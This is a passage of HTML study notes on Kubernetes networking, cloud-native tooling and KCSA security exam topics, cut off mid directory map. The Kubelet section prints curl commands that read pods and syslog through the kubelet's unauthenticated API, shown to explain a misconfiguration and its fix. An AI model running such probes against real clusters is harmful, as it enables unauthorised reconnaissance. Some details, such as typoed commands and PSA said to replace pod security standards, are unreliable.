<li>Container Network Interface (CNI) is a framework for dynamically configuring networking resources. It uses a group of libraries and specifications written in Go. The plugin specification defines an interface for configuring the network, provisioning IP addresses, and maintaining connectivity with multiple hosts.</li>
</ul>
<h2 id="dns-1"><a class="header" href="#dns-1">DNS</a></h2>
<ul>
<li>Domain Name Service</li>
<li>Used to resolve names to IP addresses</li>
<li>CoreDNS is the default DNS service used in Kubernetes</li>
</ul>
<h2 id="ingress"><a class="header" href="#ingress">Ingress</a></h2>
<ul>
<li></li>
</ul>
<h2 id="services"><a class="header" href="#services">Services</a></h2>
<ul>
<li>Services are like a load balancer. They load balance traffic to backend pods (referred to as endpoints)</li>
<li>There are 3 types of services in Kubernetes
<ul>
<li>ClusterIP
<ul>
<li>the default</li>
<li>The service IP address is only available inside the cluster</li>
</ul>
</li>
<li>NodePort
<ul>
<li>Makes the service accessible on a predefined port on all nodes in the cluster</li>
</ul>
</li>
<li>LoadBalancer
<ul>
<li>Provisions a load balancer in a cloud environment to make the service accessible</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="sidecars"><a class="header" href="#sidecars">Sidecars</a></h2>
<ul>
<li>Sidecars are a secondary container running inside our pod that provide a service for the primary pod</li>
<li>An example is a container in our pod that ships logs to an external service for the business-logic container</li>
</ul>
<h2 id="envoy"><a class="header" href="#envoy">Envoy</a></h2>
<ul>
<li></li>
</ul>
<h2 id="storage"><a class="header" href="#storage">Storage</a></h2>
<ul>
<li></li>
</ul>
<h1 id="cloud-native-architecture"><a class="header" href="#cloud-native-architecture">Cloud Native Architecture</a></h1>
<h2 id="autoscaling"><a class="header" href="#autoscaling">Autoscaling</a></h2>
<ul>
<li>Horizontal Pod Autoscaler (HPA)
<ul>
<li>Automatically scales the number of pods in a deployment based on CPU utilization or custom metrics</li>
</ul>
</li>
<li>Vertical Pod Autoscaler (VPA)
<ul>
<li>Automatically adjusts the CPU and memory requests and limits for a pod based on its usage</li>
</ul>
</li>
<li>Cluster Autoscaler
<ul>
<li>Automatically adjusts the number of nodes in a cluster based on resource demands</li>
</ul>
</li>
</ul>
<h2 id="kubernetes-keps-and-sigs"><a class="header" href="#kubernetes-keps-and-sigs">Kubernetes KEPs and SIGs</a></h2>
<ul>
<li>Kubernetes Enhancement Proposals (KEPs) are used to propose and track major changes to Kubernetes</li>
<li>Special Interest Groups (SIGs) are used to organize contributors around specific areas of the project</li>
</ul>
<h1 id="cloud-native-application-delivery"><a class="header" href="#cloud-native-application-delivery">Cloud Native Application Delivery</a></h1>
<h2 id="gitops"><a class="header" href="#gitops">GitOps</a></h2>
<ul>
<li>
<h2 id="what-is-gitops"><a class="header" href="#what-is-gitops">What is GitOps</a></h2>
</li>
<li>GitOps Principles
<ul>
<li>Declarative - The entire system must be described desclaritively</li>
<li>Versioned/Immutable -</li>
<li>Pulled Automatically - Changes must be applied automatically</li>
<li>Continuously Reconciled - Monitor desired state vs. actual state and reconcile if needed</li>
</ul>
</li>
</ul>
<h1 id="observability"><a class="header" href="#observability">Observability</a></h1>
<h2 id="prometheus"><a class="header" href="#prometheus">Prometheus</a></h2>
<ul>
<li>Prometheus is an open-source monitoring and alerting system</li>
<li>Prometheus scrapes metrics from instrumented jobs and stores them in a time-series database</li>
<li>Prometheus provides a query language (PromQL) to query and visualize the collected metrics</li>
<li>Prometheus can be integrated with Grafana for visualization</li>
<li>Prometheus can be used to monitor Kubernetes clusters and applications running on Kubernetes</li>
<li>Prometheus is designed to collect numeric database, not logs.</li>
<li>Exporters run on the nodes and expose metrics to Prometheus</li>
<li>Prometheus scrapes the metrics from the exporters</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory Map</a></h2>
<ul>
<li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes-certified-security-associate-kcsa-notes"><a class="header" href="#kubernetes-certified-security-associate-kcsa-notes">Kubernetes Certified Security Associate (KCSA) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/kcsa/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/kcsa/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/kcsa/">https://www.cncf.io/certification/kcsa/</a>
<h1 align="center">Kubernetes Certified Security Associate (KCSA) Notes</h1>

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList= alse} -->
<h1 id="table-of-contents-9"><a class="header" href="#table-of-contents-9">Table of Contents</a></h1>
<ul>
<li><a href="#exam-2">Exam</a>
<ul>
<li><a href="#outline-2">Outline</a></li>
<li><a href="#changes-2">Changes</a></li>
</ul>
</li>
<li><a href="#preparation-2">Preparation</a>
<ul>
<li><a href="#study-resources-2">Study Resources</a></li>
<li><a href="#practice-2">Practice</a></li>
</ul>
</li>
<li><a href="#introduction-29">Introduction</a></li>
<li><a href="#overview-of-cloud-native-security">Overview of Cloud Native Security</a>
<ul>
<li><a href="#4cs-of-cloud-native-security">4Cs of Cloud Native Security</a></li>
<li><a href="#cluster-security">Cluster Security</a></li>
<li><a href="#pod-security">Pod Security</a></li>
<li><a href="#code-security">Code Security</a></li>
<li><a href="#kubernetes-threat-models">Kubernetes Threat Models</a>
<ul>
<li><a href="#attack-vectors">Attack Vectors</a></li>
<li><a href="#mitigations">Mitigations</a></li>
</ul>
</li>
<li><a href="#platform-security">Platform Security</a>
<ul>
<li><a href="#supply-chain-security">Supply Chain Security</a></li>
<li><a href="#artifact-and-image-security">Artifact and Image Security</a></li>
<li><a href="#policy-enforcement">Policy Enforcement</a></li>
</ul>
</li>
<li><a href="#compliance-frameworks">Compliance Frameworks</a>
<ul>
<li><a href="#gdpr">GDPR</a></li>
<li><a href="#hipaa">HIPAA</a></li>
<li><a href="#pci-dss">PCI DSS</a></li>
<li><a href="#cis-benchmarks">CIS Benchmarks</a></li>
</ul>
</li>
<li><a href="#threat-modeling">Threat Modeling</a>
<ul>
<li><a href="#stride-framework">STRIDE Framework</a></li>
<li><a href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></li>
</ul>
</li>
<li><a href="#observability-and-incident-response">Observability and Incident Response</a>
<ul>
<li><a href="#monitoring-and-logging">Monitoring and Logging</a></li>
<li><a href="#incident-investigation-tools">Incident Investigation Tools</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-cluster-component-security">Kubernetes Cluster Component Security</a>
<ul>
<li><a href="#kube-api-server">Kube-api Server</a></li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam-2"><a class="header" href="#exam-2">Exam</a></h1>
<h2 id="outline-2"><a class="header" href="#outline-2">Outline</a></h2>
<ul>
<li><strong>Exam Duration:</strong> 2 hours</li>
<li><strong>Number of Questions:</strong> 50</li>
<li><strong>Question Format:</strong> Multiple choice</li>
<li><strong>Passing Score:</strong> 66%</li>
<li><strong>Exam Cost:</strong> $300</li>
</ul>
<h2 id="changes-2"><a class="header" href="#changes-2">Changes</a></h2>
<ul>
<li></li>
</ul>
<hr>
<h1 id="preparation-2"><a class="header" href="#preparation-2">Preparation</a></h1>
<h2 id="study-resources-2"><a class="header" href="#study-resources-2">Study Resources</a></h2>
<ul>
<li><strong>Kubernetes Documentation:</strong> <a href="https://kubernetes.io/docs/">https://kubernetes.io/docs/</a></li>
</ul>
<h2 id="practice-2"><a class="header" href="#practice-2">Practice</a></h2>
<ul>
<li></li>
</ul>
<h1 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h1>
<p>The Kubernetes and Cloud Native Security Associate (KCSA) certification prepares individuals to secure Kubernetes environments and address modern cloud-native security challenges. This document consolidates core concepts, threat models, compliance standards, and best practices.</p>
<hr>
<h1 id="overview-of-cloud-native-security"><a class="header" href="#overview-of-cloud-native-security">Overview of Cloud Native Security</a></h1>
<h2 id="4cs-of-cloud-native-security"><a class="header" href="#4cs-of-cloud-native-security">4Cs of Cloud Native Security</a></h2>
<ol>
<li><strong>Code:</strong> Secure development practices (e.g., avoid hardcoding secrets).</li>
<li><strong>Container:</strong> Prevent privilege escalation, use minimal base images.</li>
<li><strong>Cluster:</strong> Restrict API server access, encrypt etcd data.</li>
<li><strong>Cloud:</strong> Use cloud-native tools for monitoring and securing infrastructure.</li>
</ol>
<h2 id="cluster-security"><a class="header" href="#cluster-security">Cluster Security</a></h2>
<ul>
<li>Harden the Kubernetes API server with role-based access control (RBAC).</li>
<li>Disable anonymous authentication for kubelet communication.</li>
</ul>
<h2 id="pod-security"><a class="header" href="#pod-security">Pod Security</a></h2>
<ul>
<li>Use Pod Security Admission (PSA) to enforce best practices (e.g., no root users).</li>
<li>Isolate sensitive workloads using namespaces and network policies.</li>
</ul>
<h2 id="code-security"><a class="header" href="#code-security">Code Security</a></h2>
<ul>
<li>Use static code analysis tools like SonarQube or Codacy.</li>
<li>Store secrets securely using Kubernetes Secrets.</li>
</ul>
<h2 id="kubernetes-threat-models"><a class="header" href="#kubernetes-threat-models">Kubernetes Threat Models</a></h2>
<h3 id="attack-vectors"><a class="header" href="#attack-vectors">Attack Vectors</a></h3>
<ul>
<li><strong>Privilege Escalation:</strong> Exploiting weak RBAC configurations.</li>
<li><strong>Unauthorized Access:</strong> Using misconfigured service accounts.</li>
<li><strong>Data Theft:</strong> Exploiting unencrypted volumes or exposed secrets.</li>
</ul>
<h3 id="mitigations"><a class="header" href="#mitigations">Mitigations</a></h3>
<ul>
<li>Apply principle of least privilege with RBAC.</li>
<li>Use encryption for both data at rest and in transit.</li>
<li>Regularly scan images for vulnerabilities.</li>
</ul>
<h2 id="platform-security"><a class="header" href="#platform-security">Platform Security</a></h2>
<h3 id="supply-chain-security"><a class="header" href="#supply-chain-security">Supply Chain Security</a></h3>
<ul>
<li>Use SBOMs (Software Bill of Materials) to track dependencies.</li>
<li>Sign container images using tools like Cosign.</li>
</ul>
<h3 id="artifact-and-image-security"><a class="header" href="#artifact-and-image-security">Artifact and Image Security</a></h3>
<ul>
<li>Enforce vulnerability scanning with tools like Trivy or Clair.</li>
<li>Ensure images come from trusted registries.</li>
</ul>
<h3 id="policy-enforcement"><a class="header" href="#policy-enforcement">Policy Enforcement</a></h3>
<ul>
<li>Use tools like Kyverno and OPA Gatekeeper to validate deployments.</li>
<li>Enforce policies for image signatures, namespace isolation, and resource quotas.</li>
</ul>
<h2 id="compliance-frameworks"><a class="header" href="#compliance-frameworks">Compliance Frameworks</a></h2>
<h3 id="gdpr"><a class="header" href="#gdpr">GDPR</a></h3>
<ul>
<li>Encrypt sensitive user data in transit and at rest.</li>
<li>Implement RBAC to restrict access to personal data.</li>
</ul>
<h3 id="hipaa"><a class="header" href="#hipaa">HIPAA</a></h3>
<ul>
<li>Ensure secure handling of healthcare information using TLS and encrypted storage.</li>
<li>Log and monitor access to healthcare data.</li>
</ul>
<h3 id="pci-dss"><a class="header" href="#pci-dss">PCI DSS</a></h3>
<ul>
<li>Segment payment data workloads with network policies.</li>
<li>Regularly audit access controls and encryption compliance.</li>
</ul>
<h3 id="cis-benchmarks"><a class="header" href="#cis-benchmarks">CIS Benchmarks</a></h3>
<ul>
<li>Use kube-bench to check Kubernetes against CIS recommendations.</li>
<li>Ensure secure API server and etcd configurations.</li>
</ul>
<h2 id="threat-modeling"><a class="header" href="#threat-modeling">Threat Modeling</a></h2>
<h3 id="stride-framework"><a class="header" href="#stride-framework">STRIDE Framework</a></h3>
<ul>
<li><strong>Spoofing:</strong> Prevent by enforcing strong authentication (e.g., mTLS).</li>
<li><strong>Tampering:</strong> Ensure data integrity with digital signatures.</li>
<li><strong>Information Disclosure:</strong> Encrypt all sensitive data.</li>
<li><strong>Denial of Service:</strong> Use resource quotas and rate limits.</li>
</ul>
<h3 id="mitre-attck-framework"><a class="header" href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></h3>
<ul>
<li>Focuses on real-world attack scenarios.</li>
<li>Categories include Initial Access, Persistence, Privilege Escalation, and Defense Evasion.</li>
</ul>
<h2 id="observability-and-incident-response"><a class="header" href="#observability-and-incident-response">Observability and Incident Response</a></h2>
<h3 id="monitoring-and-logging"><a class="header" href="#monitoring-and-logging">Monitoring and Logging</a></h3>
<ul>
<li>Use <strong>Prometheus</strong> for metrics collection and alerting.</li>
<li>Use <strong>Fluentd</strong> or <strong>Elasticsearch</strong> for log aggregation and search.</li>
</ul>
<h3 id="incident-investigation-tools"><a class="header" href="#incident-investigation-tools">Incident Investigation Tools</a></h3>
<ul>
<li>Use <strong>Falco</strong> for runtime security alerts.</li>
<li>Use <strong>Zeek</strong> and <strong>Snort</strong> for network intrusion detection.</li>
</ul>
<hr>
<h1 id="kubernetes-cluster-component-security"><a class="header" href="#kubernetes-cluster-component-security">Kubernetes Cluster Component Security</a></h1>
<ul>
<li>Use TLS to ensure all traffic between cluster control-plane components is encrypted</li>
</ul>
<h2 id="kube-api-server"><a class="header" href="#kube-api-server">Kube-API Server</a></h2>
<ul>
<li>Kube-API server is at the center of all operations in a Kubernetes cluster</li>
<li>In regards to security, we need to make 2 decisions, who can access the cluster, and what can they do?
<ul>
<li>Certificates</li>
<li>LDAP</li>
<li>Service Accounts</li>
</ul>
</li>
<li>Once they gain access to the cluster, what they can do is defined by authorization mechanisms:
<ul>
<li>RBAC</li>
<li>ABAC</li>
</ul>
</li>
</ul>
<h2 id="controller-manager-and-scheduler"><a class="header" href="#controller-manager-and-scheduler">Controller Manager and Scheduler</a></h2>
<ul>
<li>Controller manager ensures nodes are healthy, manages pods and controllers, etc.</li>
<li>The scheduler determines where (on which nodes) the pods can run on in a cluster</li>
<li>To protect either of these components, you need to isolate them.</li>
</ul>
<h2 id="kubelet"><a class="header" href="#kubelet">Kubelet</a></h2>
<ul>
<li>Kubelet runs on the worker nodes and manages the node</li>
<li>Kubelet registers the node with the control-plane</li>
<li>Kubelet listens on 2 ports:
<ul>
<li>10250: Serves API that allows full access</li>
<li>10255: Serves API that allows unauthenticated, read-only access</li>
</ul>
</li>
<li>By default, kubelet allows anonymous access to it‚Äôs API.
<ul>
<li><code>curl -sk https://nodename:10250/pods/</code></li>
<li><code>curl -sk https://nodename:10250/logs/syslog/</code></li>
<li><code>curl -sk https://nodename:10255/metrics/</code></li>
<li>This can be disabled by setting <code>anonymous-auth=false</code> in the kubelet config</li>
<li>Kubelet supports 2 types of authentication, bearer token and certificate-based</li>
</ul>
</li>
</ul>
<h2 id="security-the-container-runtime"><a class="header" href="#security-the-container-runtime">Security the Container Runtime</a></h2>
<ul>
<li>The container runtime is responsible for running the containers</li>
<li>CRI (Container Runtime Interface) allows Kubernetes to use any container runtime that is compliant with CRI</li>
<li>The most common container runtime is Docker, but others include containerd, cri-o, etc.</li>
<li>You should configure pods and containers to run with least privileges by configuring the security context</li>
<li>You should also scan the images for vulnerabilities before deploying them</li>
</ul>
<h2 id="securing-kubeproxy"><a class="header" href="#securing-kubeproxy">Securing KubeProxy</a></h2>
<ul>
<li>KubeProxy is responsible for managing the network in a Kubernetes cluster</li>
<li>Ensure that proper permissions are set on the kube-proxy config file
<pre><code>&gt; px aux |grep -i kube-proxy |grep -i config - This will show the kube-proxy process and the config file it is using
&gt; ls -l /var/lib/kube-proxy/kube-config.conf - This will show the permissions on the kube-proxy config file
</code></pre>
</li>
</ul>
<h2 id="pod-security-1"><a class="header" href="#pod-security-1">Pod Security</a></h2>
<h3 id="pod-security-admission-1"><a class="header" href="#pod-security-admission-1">Pod Security Admission</a></h3>
<ul>
<li>Pod Security Policies (PSP) are deprecated in Kubernetes 1.21</li>
<li>Pod Security Admission (PSA) is the new way to enforce security policies on pods</li>
<li>PSA is a webhook that intercepts pod creation requests and validates them against a set of policies</li>
</ul>
<h2 id="securing-etcd-1"><a class="header" href="#securing-etcd-1">Securing etcd</a></h2>
<ul>
<li>etcd is a distributed key-value store that stores the state of the cluster</li>
<li>etcd is a critical component of the cluster and should be secured</li>
<li>etcd should be configured to use TLS for encryption. To encrypt the database, you can create a <code>EncryptionConfiguration</code> object and pass it to the etcd pod</li>
</ul>
<h1 id="kubernetes-security-fundamentals"><a class="header" href="#kubernetes-security-fundamentals">Kubernetes Security Fundamentals</a></h1>
<h2 id="pod-security-admission-1-1"><a class="header" href="#pod-security-admission-1-1">Pod Security Admission</a></h2>
<ul>
<li>Replaces pod security standards</li>
<li>Meant to be safe and easy to use.</li>
<li>Enabled by default. Runs as an admission controller.</li>
<li>Applied to namespaces. To apply to a namespace, simply add a label:
<pre><code>kubectl label ns &lt;namespace&gt; pod-security.kubernetes.io/&lt;mode&gt;=&lt;security standard&gt;
</code></pre>
<ul>
<li>
<p>Modes:</p>
<ul>
<li>What action to take if a pod violates the policy</li>
<li>The modes are: enforce, audit, warn</li>
</ul>
</li>
<li>
<p>Standards:</p>
<ul>
<li>These are built-in policies</li>
<li>They are: Privileged, baseline, and restricted</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="authentication-4"><a class="header" href="#authentication-4">Authentication</a></h2>
<ul>
<li>Kubernetes does not manage user accounts itself. It depends on an external service to do that.</li>
<li>All authentication is managed by the kube-api server</li>
<li>Kube-api server authenticates users via certificates, tokens, or an external service such as LDAP or Kerberos</li>
</ul>
<h2 id="authorization-2"><a class="header" href="#authorization-2">Authorization</a></h2>
<ul>
<li>Once someone or something is authenticated, what are they able to do? This is authorization.</li>
<li>There are 6 different authorization modes in Kubernetes:
<ul>
<li>Node</li>
<li>ABAC</li>
<li>RBAC</li>
<li>Webhook</li>
<li>AlwaysAllow (the default)</li>
<li>AlwaysDeny</li>
</ul>
</li>
<li>Authorization mode can be configured on the kube-api server using the <code>--authorization-mode</code> flag</li>
</ul>
<h3 id="rbac"><a class="header" href="#rbac">RBAC</a></h3>
<ul>
<li></li>
<li>Role, ClusterRole, RoleBinding ClusterRoleBinding</li>
</ul>
<h2 id="secrets"><a class="header" href="#secrets">Secrets</a></h2>
<ul>
<li>Secrets are used to store sensitive information</li>
<li>They are similar in concept to <code>ConfigMaps</code></li>
<li>Secrets are not encrypted, they are base64 encoded</li>
<li>Secrets are only loaded on nodes where they are needed.</li>
</ul>
<h2 id="namespaces"><a class="header" href="#namespaces">Namespaces</a></h2>
<ul>
<li>Namespaces can be used to isolate or organize resources in a Kubernetes cluster</li>
<li>RBAC can be applied to namespaces for authorization</li>
<li></li>
</ul>
<h2 id="resource-quotas-and-limits"><a class="header" href="#resource-quotas-and-limits">Resource Quotas and Limits</a></h2>
<h3 id="resource-requests-and-limits"><a class="header" href="#resource-requests-and-limits">Resource Requests and Limits</a></h3>
<h3 id="resource-quotas-1"><a class="header" href="#resource-quotas-1">Resource Quotas</a></h3>
<ul>
<li>Set a hard limit for resource requests and quotas defined on a pod</li>
</ul>
<h3 id="limit-ranges"><a class="header" href="#limit-ranges">Limit Ranges</a></h3>
<h2 id="security-context"><a class="header" href="#security-context">Security Context</a></h2>
<ul>
<li>a Security Context gives you the ability to do several things:
<ul>
<li>run the container as a different UID/GID</li>
<li>make the root file system read-only</li>
<li>etc</li>
</ul>
</li>
<li>Some settings can be applied on the pod, and some can be applied on the container</li>
</ul>
<h1 id="kubernetes-threat-model"><a class="header" href="#kubernetes-threat-model">Kubernetes Threat Model</a></h1>
<ul>
<li>Threat modeling helps you identify potential threats, understand their impact, and put measures in place to prevent them</li>
<li>Understand how traffic/data flows in the environment and identity vulnerabilities at each point</li>
</ul>
<h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
<ul>
<li>Once an attacker accesses the environment, the first goal is typically to establishpersistence.</li>
<li>Persistence allows attackers to maintain access to a cluster</li>
</ul>
<h2 id="denial-of-service"><a class="header" href="#denial-of-service">Denial of Service</a></h2>
<ul>
<li>Set resource quotas to prevent excessive resource usage</li>
<li>Restrict service account permissions</li>
<li>Use Network Policies and firewalls to control access</li>
<li>Monitor and alert on unusual activity</li>
</ul>
<h1 id="platform-security-1"><a class="header" href="#platform-security-1">Platform Security</a></h1>
<h2 id="observability-1"><a class="header" href="#observability-1">Observability</a></h2>
<ul>
<li>Falco is a tool that can be used to monitor actions taken on cluster nodes, such as reading/writing files, etc.</li>
</ul>
<h2 id="service-mesh"><a class="header" href="#service-mesh">Service Mesh</a></h2>
<ul>
<li>A service mesh is a dedicated infrastructure layer for handling service-to-service communication</li>
<li>It can handle service discovery, load balancing, encryption, etc.</li>
<li>Istio is a popular service mesh</li>
</ul>
<h3 id="istio"><a class="header" href="#istio">Istio</a></h3>
<ul>
<li>Istio is a service mesh that provides a way to control how microservices share data with each other</li>
<li>Istio works with Kubernetes and traditional workloads</li>
<li>Istio uses a high-performance proxy service called Envoy to manage traffic between services</li>
</ul>
<h2 id="certificates"><a class="header" href="#certificates">Certificates</a></h2>
<h3 id="openssl"><a class="header" href="#openssl">Openssl</a></h3>
<ul>
<li>You can use <code>openssl</code> to generate certificates for the cluster</li>
<li>Generate keys: <code>openssl genrsa -out my.key 2048</code></li>
<li>Create a CSR: <code>openssl req -new -key my.key -sub "/CN=KUBERNETES-CA" -out ca.csr</code></li>
<li>Sign certificates: <code>openss x509 -req -in ca.csr -signkey my.key -out ca.crt</code></li>
</ul>
<h1 id="compliance-and-security-frameworks"><a class="header" href="#compliance-and-security-frameworks">Compliance and Security Frameworks</a></h1>
<h2 id="compliance-frameworks-1"><a class="header" href="#compliance-frameworks-1">Compliance Frameworks</a></h2>
<ul>
<li>Examples: GDPR, HIPAA, NIST, PCI DSS, CIS</li>
</ul>
<h3 id="gdpr-1"><a class="header" href="#gdpr-1">GDPR</a></h3>
<ul>
<li>Introduced by the European Union to protect the data of citizens</li>
</ul>
<h3 id="hipaa-1"><a class="header" href="#hipaa-1">HIPAA</a></h3>
<ul>
<li>A United States regulation used to control the access to health data</li>
</ul>
<h3 id="pci-dss-1"><a class="header" href="#pci-dss-1">PCI DSS</a></h3>
<ul>
<li>Used to protect payment data</li>
</ul>
<h3 id="nist"><a class="header" href="#nist">NIST</a></h3>
<ul>
<li>Created by the United States but recognized globally.</li>
<li>Used to protect compute environments by doing regular security-related audits (pentests, etc.)</li>
</ul>
<h3 id="cis"><a class="header" href="#cis">CIS</a></h3>
<ul>
<li>CIS creates benchmarks for various environments such as operating systems and Kubernetes</li>
</ul>
<h2 id="threat-modeling-frameworks"><a class="header" href="#threat-modeling-frameworks">Threat-Modeling Frameworks</a></h2>
<ul>
<li>Threat-modeling frameworks defined how to achieve the compliance frameworks mentioned above</li>
<li>Two thread-models of interests are STRIDE and MITRE</li>
</ul>
<h3 id="stride"><a class="header" href="#stride">STRIDE</a></h3>
<ul>
<li>Created and maintained by Microsoft</li>
<li>Helps identity 6 categories of threats
<ul>
<li>Spoofing</li>
<li>Tampering</li>
<li>Repudiation</li>
<li>Information Disclosure</li>
<li>Denial of Service</li>
<li>Elevation of Privilege</li>
</ul>
</li>
</ul>
<h3 id="mitre"><a class="header" href="#mitre">MITRE</a></h3>
<ul>
<li>5 categories
<ul>
<li>Initial Access</li>
<li>Execution</li>
<li>Persistence</li>
<li>Privilege Escalation</li>
<li>Defense Evasion</li>
</ul>
</li>
<li>https://microsoft.github.io/Threat-Matrix-for-Kubernetes/</li>
</ul>
<h2 id="supply-chain-compliance"><a class="header" href="#supply-chain-compliance">Supply Chain Compliance</a></h2>
<ul>
<li>Verify all the components (libraries, container images, etc.) that make up your application are secure and meet compliance requirements</li>
<li>Securing the supply chain focuses on 4 main areas:
<ul>
<li>artifacts</li>
<li>metadata</li>
<li>attestations</li>
<li>policies</li>
</ul>
</li>
</ul>
<h3 id="reduce-docker-image-size-1"><a class="header" href="#reduce-docker-image-size-1">Reduce docker image size</a></h3>
<ul>
<li>
<p>Smaller images are faster to download and deploy</p>
</li>
<li>
<p>Smaller images are more secure</p>
</li>
<li>
<p>Smaller images are easier to manage</p>
</li>
<li>
<p>To reduce the size of a docker image:</p>
<ul>
<li>Use a smaller base image</li>
<li>Use specific package/image versions</li>
<li>Make file-system read-only</li>
<li>Don‚Äôt run the container as root</li>
<li>Use multi-stage builds</li>
<li>Remove unnecessary files</li>
<li>Use a <code>.dockerignore</code> file to exclude files and directories from the image</li>
<li>Use <code>COPY</code> instead of <code>ADD</code></li>
<li>Use <code>alpine</code> images</li>
<li>Use <code>scratch</code> images</li>
<li>Use <code>distroless</code> images</li>
</ul>
</li>
<li>
<p>Example of a multi-stage build:</p>
<pre><code># build container stage 1
  FROM ubuntu
  ARG DEBIAN_FRONTEND=noninteractive
  RUN apt-get update &amp;&amp; apt-get install -y golang-go
  COPY app.go .
  RUN CGO_ENABLED=0 go build app.go

# app container stage 2
  FROM alpine:3.12.1 # it is better to use a defined tag, rather than 'latest'
  RUN addgroup -S appgroup &amp;&amp; adduser -S appuser -G appgroup -h /home/appuser
  COPY --from=0 /app /home/appuser/app
  USER appuser # run as a non-root user
  CMD ["/home/appuser/app"]
</code></pre>
</li>
<li>
<p>Dockerfile best practices: https://docs.docker.com/build/building/best-practices/</p>
</li>
<li>
<p>Only certain docker directives create new layers in an image</p>
<ul>
<li><code>FROM</code></li>
<li><code>COPY</code></li>
<li><code>CMD</code></li>
<li><code>RUN</code></li>
</ul>
</li>
<li>
<p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
</li>
</ul>
<h3 id="static-analysis-1"><a class="header" href="#static-analysis-1">Static Analysis</a></h3>
<h4 id="sbom-2"><a class="header" href="#sbom-2">SBOM</a></h4>
<ul>
<li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
<li>Formats
<ul>
<li>SPDX
<ul>
<li>The standard format for sharing SBOM</li>
<li>Available in JSON, RDF, and tag/value formats</li>
<li>More complex than CycloneDX due to it‚Äôs extensive metadata coverage</li>
<li>Comprehensive metadata including license information, origin, and file details</li>
</ul>
</li>
<li>CycloneDX
<ul>
<li>A lightweight format focused on security and compliance</li>
<li>Available in JSON and XML formats</li>
<li>Simpler and more focused on essential SBOM elements</li>
<li>Focuses on component details, vulnerabilities, and dependencies</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="kubesec-1"><a class="header" href="#kubesec-1">Kubesec</a></h4>
<ul>
<li>Used for static analysis of manifests</li>
<li>https://github.com/controlplaneio/kubesec</li>
</ul>
<h4 id="syft-1"><a class="header" href="#syft-1">Syft</a></h4>
<ul>
<li>Syft is a powerful and easy-to-use open-source tool for generating Software Bill of Materials (SBOMs) for container images and filesystems. It provides detailed visibility into the packages and dependencies in your software, helping you manage vulnerabilities, license compliance, and software supply chain security.</li>
<li>Syft can export results in SPDX, CycloneDX, JSON, etc.</li>
<li>To scan an image with syft and export the results to a file in SPDX format:
<pre><code>syft scan docker.io/kodekloud/webapp-color:latest -o spdx --file /root/webapp-spdx.sbom
</code></pre>
</li>
</ul>
<h4 id="grype-1"><a class="header" href="#grype-1">Grype</a></h4>
<ul>
<li>Grype is a tool (also from Anchore) that can be used to scan SBOM for vulnerabilities</li>
<li>To scan a SBOM with Grype:
<pre><code>grype /root/webapp-sbom.json -o json --file /root/grype-report.json
</code></pre>
</li>
</ul>
<h4 id="kube-linter-1"><a class="header" href="#kube-linter-1">Kube-linter</a></h4>
<ul>
<li>Kube-linter can be used to lint Kubernetes manifests and ensure best practices are being followed</li>
<li>kube-linter is configurable. You can disable/enable checks and even create your own custom checks</li>
<li>kube-linter includes recommendations for how to fix failed checks</li>
<li>https://github.com/stackrox/kube-linter</li>
</ul>
<h3 id="scanning-images-for-vulnerabilities-1"><a class="header" href="#scanning-images-for-vulnerabilities-1">Scanning Images for Vulnerabilities</a></h3>
<h4 id="trivy-1"><a class="header" href="#trivy-1">trivy</a></h4>
<ul>
<li>trivy can be used to scan images for vulnerabilities</li>
<li>https://github.com/aquasecurity/trivy</li>
<li>Example:
<pre><code>  sudo docker run --rm  aquasec/trivy:0.17.2 nginx:1.16-alpine
</code></pre>
</li>
</ul>
</h4>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
<ul>
<li><a href="networking/browser-networking">browser-networking</a></li>
<li><a href="networking/http">http</a></li>
<li><a href="networking/load-balancing">load-balancing</a></li>
<li><a href="networking/nginx">nginx</a></li>
<li><a href="networking/rate-limiting">rate-limiting</a></li>
</ul>
<h2 id="protocols"><a class="header" href="#protocols">Protocols</a></h2>
<ul>
<li><a href="#ftp">FTP</a></li>
<li><a href="#dns-2">dns</a></li>
<li><a href="#ftp">ftp</a></li>
<li><a href="#icmp">icmp</a></li>
<li><a href="#imap--pop3">imap/pop3</a></li>
<li><a href="#mqtt">mqtt</a></li>
<li><a href="#nfs-network-file-system">nfs</a></li>
<li><a href="#ntp">ntp</a></li>
<li><a href="#quic">quic</a></li>
<li><a href="#server-message-block-smb">smb</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">smtp</a></li>
<li><a href="#snmp">snmp</a></li>
<li><a href="#ssh">ssh</a></li>
<li><a href="#tls">tls</a></li>
<li><a href="#udp-1">udp</a></li>
<li><a href="networking/protocols/websocket.html">websocket</a></li>
<li><a href="#ipmi">IPMI</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
<ul>
<li><a href="#chapter-1">chapter01</a></li>
<li><a href="#chapter-2">chapter02</a></li>
<li><a href="#chapter-3">chapter03</a></li>
<li><a href="#chapter-4">chapter04</a></li>
<li><a href="#chapter09">chapter09</a></li>
<li><a href="#chapter-10">chapter10</a></li>
